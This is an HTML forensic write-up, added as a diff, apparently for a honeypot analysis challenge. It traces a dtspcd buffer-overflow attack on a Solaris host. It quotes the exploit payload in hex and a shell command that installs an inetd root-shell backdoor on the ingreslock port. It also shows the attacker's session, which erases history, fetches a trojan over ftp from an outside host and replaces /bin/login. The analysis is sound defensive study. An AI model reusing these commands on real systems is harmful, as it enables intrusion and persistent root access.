@@ -1,0 +1,199 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Frameset//EN" "http://www.w3.org/TR/html4/frameset.dtd"><html><head>
+
+<title>Write-up of Scan 20</title><style>
+<!--
+.title    { font-size:16.0pt;
+            font-weight: bold;
+            font-family: Helvetica, Arial, sans-serif;
+            text-align: center;}
+.subtitle { font-size:11.0pt;
+            font-weight: bold;
+            font-family: Helvetica, Arial, sans-serif;}
+.text     { font-size:10.0pt;
+            font-family: Helvetica, Arial, sans-serif;}
+.listing  { font-size:8.0pt;
+            font-family: Courier, monospace;
+            white-space: pre;}
+.blackhat { color: #8080A0;}
+-->
+</style></head>
+
+<body>
+<p class="title">Write-up of Scan 20</p>
+<p class="subtitle">Short summary of events</p>
+<p class="text">A lot of various scans and attacks on the subnet until the real attack begins at packet 482 
+(2002-01-08 15:19:17.4568).</p>
+<p class="text">Here we see a scan over the network hosts on port 6112 which is the port of the dtspcd service.</p>
+<p class="text">We see that three hosts on the net reply to the scan:</p>
+
+<ul>
+<li class="text">172.16.1.102 ACK at packet 484</li>
+<li class="text">172.16.1.105 ACK at packet 493</li>
+<li class="text">172.16.1.108 ACK at packet 492</li>
+</ul>
+
+<p class="text">These three hosts are probably running CDE and the dtspcd
+service. The blackhat (208.61.69.153) connects to these hosts but disconnects
+after a few seconds.</p>
+<p class="text">Now the blackhat has pinpointed three vulnerable targets in our net.</p>
+<p class="text">Some 25 minutes later at packet 526 the blackhat begins exploring
+the system. By using the "follow TCP stream" utility of ethereal we can trace
+the contents of the TCP session that begins here. We find the following conversation
+in packets 526 to 537:</p>
+<p class="listing"><span class="text">Blackhat:</span> 0000000204000d0001  4 .root..10..</p>
+<p class="text">This seems to be a request to the dtspcd service, it closely
+resembles the signature of the real exploit as found from the CERT advisory:
+ "0000000204103e0001  4 ...10.". However the "length" boundary seems to be
+reasonable in this request (0x000d) which indicates that this is not the
+exploit but rather a probe of the CDE.</p>
+<p class="listing"><span class="text">Honeypot:</span> 0000000014002f00013 ./ /.SPC_AAAH_aqWg. 1000.buzzy:SunOS :5.8:sun4u.</p>
+<p class="text">The blackhat gets some information; hostname apparently is
+buzzy, OS version is SunOS 5.8 (Solaris 8) and running on an Ultrasparc machine
+(Sun4U series).</p>
+<p class="text">A few seconds after this probe, the blackhat also probes
+the ingreslock service of the honeypot. This is probably to see if there
+is an ingreslock backdoor <a href="#References">[1]</a> already installed
+on the system. Since there is no ingreslock backdoor (packets 538-539), the
+blackhat proceeds at packet 540 by attacking the system with the actual dtspcd
+exploit. We extract the data from this conversation and find that the blackhat
+sends:</p>
+
+<p class="text">[packets 540-551]</p>
+
+<p class="listing">
+30 30 30 30 30 30 30 32  30 34 31 30 33 65 30 30 00000002 04103e00<br>
+30 31 20 20 34 20 00 00  00 31 30 00 80 1c 40 11 01  4 .. .10...@.<br>
+80 1c 40 11 10 80 01 01  80 1c 40 11 80 1c 40 11 ..@..... ..@...@.<br>
+80 1c 40 11 80 1c 40 11  80 1c 40 11 80 1c 40 11 ..@...@. ..@...@.<br>
+</p>
+<p class="text">etc.</p>
+<p class="listing">
+80 1c 40 11 80 1c 40 11  80 1c 40 11 80 1c 40 11 ..@...@. ..@...@.<br>
+80 1c 40 11 80 1c 40 11  80 1c 40 11 20 bf ff ff ..@...@. ..@. ...<br>
+20 bf ff ff 7f ff ff ff  90 03 e0 34 92 23 e0 20  ...&#127;... ...4.#.<br>
+a2 02 20 0c a4 02 20 10  c0 2a 20 08 c0 2a 20 0e .. ... . .* ..* .<br>
+d0 23 ff e0 e2 23 ff e4  e4 23 ff e8 c0 23 ff ec .#...#.. .#...#..<br>
+82 10 20 0b 91 d0 20 08  2f 62 69 6e 2f 6b 73 68 .. ... . /bin/ksh<br>
+20 20 20 20 2d 63 20 20  65 63 68 6f 20 22 69 6e     -c   echo "in<br>
+67 72 65 73 6c 6f 63 6b  20 73 74 72 65 61 6d 20 greslock  stream <br>
+74 63 70 20 6e 6f 77 61  69 74 20 72 6f 6f 74 20 tcp nowa it root <br>
+2f 62 69 6e 2f 73 68 20  73 68 20 2d 69 22 3e 2f /bin/sh  sh -i"&gt;/<br>
+74 6d 70 2f 78 3b 2f 75  73 72 2f 73 62 69 6e 2f tmp/x;/u sr/sbin/<br>
+69 6e 65 74 64 20 2d 73  20 2f 74 6d 70 2f 78 3b inetd -s  /tmp/x;<br>
+73 6c 65 65 70 20 31 30  3b 2f 62 69 6e 2f 72 6d sleep 10 ;/bin/rm<br>
+20 2d 66 20 2f 74 6d 70  2f 78 20 41 41 41 41 41  -f /tmp /x AAAAA<br>
+41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41 AAAAAAAA AAAAAAAA<br>
+41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41 AAAAAAAA AAAAAAAA<br>
+</p>
+<p class="text">etc.</p>
+<p class="listing">
+41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41 AAAAAAAA AAAAAAAA<br>
+41 41 41 41 00 00 10 3e  00 00 00 14 42 42 42 42 AAAA...&gt; ....BBBB<br>
+ff ff ff ff 00 00 0f f4  43 43 43 43 00 02 c5 ec ........ CCCC....<br>
+44 44 44 44 ff ff ff ff  45 45 45 45 46 46 46 46 DDDD.... EEEEFFFF<br>
+47 47 47 47 ff 23 ca 0c  42 42 42 42 42 42 42 42 GGGG.#.. BBBBBBBB<br>
+42 42                                            BB<br>
+</p>
+<p class="text">Here we see a close match to the CERT signature of the attack
+on the first two rows. The "length" indicator is 0x103e which is 0x3e bytes
+more than the buffer size described in the CERT advisory. We see the shell
+command that the blackhat attempts to execute on the honeypot:</p>
+<p class="listing">
+/bin/ksh -c echo "ingreslock stream tcp nowait root /bin/sh sh -i"&gt;/tmp/x<br>
+/usr/sbin/inetd -s /tmp/x<br>
+sleep 10<br>
+/bin/rm -f /tmp/x<br>
+</p>
+<p class="text">which roughly does the following:</p>
+<p class="text">Create a file with inetd.conf format specifying a remote
+root shell service on the ingreslock port  (1524). Configure inetd with this
+file, wait 10 seconds and then delete the config file. The method is a more
+careful variation of the "bob" backdoor installation procedure outlined in
+<a href="#References">[1]</a>. inetd -s apparently starts inetd outside some service manager which otherwise seems to provide some measure of security <a href="#References">[2]</a>.</p>
+<p class="text">The attack is immediately repeated in packets 552 to 564,
+again in packets 656 to 577 and finally in packets 578 to 594. There are
+only two or three bytes that differ between the four attempts. The exploit
+is presumably trying pre-set tuning of the stack overflow parameters or attempting
+to overcome the effect of cacheing, thus ensuring that the exploit will work.</p>
+<p class="text">Apparently the exploit is successful, at packet 589 the blackhat
+successfully connects to the honeypot. We see the following conversation
+between the blackhat and the honeypot in packets 589 to 840:</p>
+
+<p class="listing">
+<span class="blackhat">uname -a;ls -l /core /var/dt/tmp/DTSPCD.log;PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;export
+PATH;echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print
+$2}'`</span><br>
+# SunOS buzzy 5.8 Generic_108528-03 sun4u sparc SUNW,Ultra-5_10<br>
+/core: No such file or directory<br>
+/var/dt/tmp/DTSPCD.log: No such file or directory<br>
+BD PID(s): 3476<br>
+#<span class="blackhat"> w</span><br>
+  8:47am  up 11:24,  0 users,  load average: 0.12, 0.04, 0.02<br>
+User     tty           login@  idle   JCPU   PCPU  what<br>
+# <span class="blackhat">unset HISTFILE</span><br>
+# <span class="blackhat">cd /tmp<br>
+mkdir /usr/lib</span><br>
+# mkdir: Failed to make directory "/usr/lib"; File exists<br>
+# <span class="blackhat">mv /bin/login /usr/lib/libfl.k</span><br>
+# <span class="blackhat">ftp 64.224.118.115</span><br>
+ftp<br>
+ftp: ioctl(TIOCGETP): Invalid argument<br>
+Password:<span class="blackhat">a@</span><br>
+<br>
+<span class="blackhat">cd pub</span><br>
+<span class="blackhat">binary</span><br>
+<span class="blackhat">get sun1</span><br>
+<span class="blackhat">bye</span><br>
+Name (64.224.118.115:root): #<br>
+# <span class="blackhat">ls</span><br>
+ps_data<br>
+sun1<br>
+# <span class="blackhat">chmod 555 sun1</span><br>
+# <span class="blackhat">mv sun1 /bin/login</span><br>
+# <br>
+</p>
+<p class="text">As we can see, the blackhat retrieves a file via ftp (sun1)
+(packets 667 to 776) which is used to replace the "login" system binary.
+We can recover "sun1" with ethereal and find that it appears to be an ELF-format
+binary executable. If we look at the strings inside this file we find a lot
+of interesting things. One of the most interesting strings is the string
+"/usr/lib/libfl.k" which is exactly the name of the "real" login executable
+after the blackhat moved it out of the way for "sun1". Could it be that sun1
+is a wrapper for the real login program?</p>
+<p class="text">Less than half a minute after the blackhat has completed
+the login replacement operation someone connects via telnet from another
+system: 66.156.236.56 (packets 810 to 835). The honeypot displays the usual
+"login" prompt. This could be the blackhat verifying that the honeypot appears
+normal to outside visitors.</p>
+<p class="subtitle">Answers:</p>
+<ol>
+<li class="text">A nop slide is "opcodes[..] to act as padding so execution pointer will ride up the stack to the shellcode." <a href="#References">[3]</a>, <a href="#References">[4]</a>. We have too little information about scan 10 to say how it is different.</li>
+<li class="text">No, the snort signature for this exploit was inserted in exploit.rules in CVS version 1.29 dated 2002-03-02 <a href="#References">[6]</a><a></a></li>
+<li class="text"><a>sh -i means that this instance of sh is interactive (talks
+to stdin/stdout/stderr). sh occurs twice because of the inetd.conf format
+"If a server must be invoked with command line arguments, the entire command
+line (including argument 0) must appear in this field" </a><a href="#References">[5]</a></li>
+<li class="text">Obviously, the commands in the payload of the exploit (/bin/ksh...)
+were all "automated". However if we do a time/sequence graph (a nice feature
+of ethereal) of the "ingreslock" session we see that some commands seem to
+be entered manually and some seem to be "pasted" into the session.</li>
+<li class="text">We believe that it is some kind of wrapper for the login program. Possibly with some connection to an irc client.</li>
+<li class="text">It raised the awareness of this type of problems for our group.</li>
+<li class="text">About 9 hours</li>
+</ol>
+<p class="text">Bonus answer</p>
+<p class="text">The command <span class="listing">echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep|awk '{print $2}'`</span>
+prints out the string BD PID(s): and the the process ID of all processes
+that have the string "-s /tmp/x" in their command-line. This is probably
+used by the blackhat to check that the backdoor actually is active (i.e.
+has a process running it). We believe that BD means backdoor. In this case
+we see that there actually is a process (3476) running the backdoor.</p>
+<a name="References"></a>
+<p class="subtitle">References</p>
+<p class="text">[1] <a href="http://www.cert.org/incident_notes/IN-99-04.html">CERT® Incident Note IN-99-04</a></p>
+<p class="text">[2] <a href="http://www.unidata.ucar.edu/cgi-bin/man-cgi?inetd+1">inetd man page</a> and <a href="http://www.unidata.ucar.edu/cgi-bin/man-cgi?sac+1">sac man page</a></p>
+<p class="text">[3] <a href="http://archives.neohapsis.com/archives/ids/2000-q2/0157.html">Max Vision writes about NOPs</a></p>
+<p class="text">[4] <a href="http://www.cccure.org/amazon/idssignature.pdf">More on buffer overflows</a></p>
+<p class="text">[5] <a href="http://sundocs.princeton.edu:8888/ab2/coll.40.5/REFMAN4/@Ab2PageView/22575?">inetd.conf man page</a></p>
+<p class="text">[6] <a href="http://cvs.sourceforge.net/cgi-bin/viewcvs.cgi/snort/snort/rules/exploit.rules.diff?r1=1.28&amp;r2=1.29">Insertion of rule for this exploit into snorts exploit.rules file</a></p>
+</body></html>
